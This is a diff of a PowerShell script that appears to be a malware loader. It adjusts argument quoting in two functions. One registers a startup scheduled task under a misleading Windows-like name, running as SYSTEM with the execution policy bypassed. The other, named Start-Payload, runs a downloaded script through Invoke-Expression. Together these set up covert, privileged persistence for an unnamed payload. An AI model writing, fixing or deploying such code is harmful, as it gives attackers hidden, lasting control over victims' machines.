@@ -23,7 +23,7 @@ function Save-Script {
 function Set-ScheduledTask {
     try {
         $taskName = "Windows scheduled task for powershell"
-        $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Ep Bypass -dc '$dc' -File '$destino'"
+        $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Ep Bypass -File `"$destino`" -dc `"$dc`""
         $taskTrigger = New-ScheduledTaskTrigger -AtStartup
         $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
         $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
@@ -39,13 +39,13 @@ function Set-ScheduledTask {
 # Create a function to run the downloaded script
 function Start-Payload {
     try {
-        $command = "powershell.exe -Ep Bypass -dc '$dc' -File '$destino'"
+        $command = "powershell.exe -Ep Bypass -File `"$destino`" -dc `"$dc`""
         Invoke-Expression $command
         Write-Output "Script executed successfully"
     }
     catch {
         Write-Error "$_"
-    }
+    }    
 }
 
 # Execute the functions
